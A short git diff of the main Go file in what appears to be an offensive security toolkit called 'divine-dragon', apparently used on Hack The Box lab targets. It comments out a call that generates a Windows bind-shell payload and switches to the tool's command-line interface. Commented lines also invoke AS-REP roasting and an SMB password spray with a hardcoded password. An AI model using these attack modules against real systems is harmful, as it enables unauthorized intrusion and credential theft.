@@ -1,6 +1,6 @@
 package main
 
-import "divine-dragon/payload_generator"
+import "divine-dragon/cli"
 
 func main() {
 	// asrep_module := remote_exploit.NewASREPRoastingModule("htb.local", "10.129.95.210", false, false, true, "svc-alfresco.txt", "remote_exploit/names2.txt", "", 50, 0)
@@ -23,8 +23,10 @@ func main() {
 
 	// smbPasswordSprayModule := remote_exploit.NewSmbSprayModule("intelligence.htb", "10.129.19.102", "445", "users.txt", "NewIntelligenceCorpUser9876", true, "", 50, 0)
 	// smbPasswordSprayModule.Run()
-	// tcli, _ := cli.NewToolCommandLineInterface()
-	// tcli.Run()
-	sopg := payload_generator.NewPayloadGenerator("10.8.0.8", "4444", "bind", "windows", "amd64", "bind.exe")
-	sopg.Run()
+
+	// sopg := payload_generator.NewPayloadGenerator("10.8.0.8", "4444", "bind", "windows", "amd64", "bind.exe")
+	// sopg.Run()
+
+	tcli, _ := cli.NewToolCommandLineInterface()
+	tcli.Run()
 }
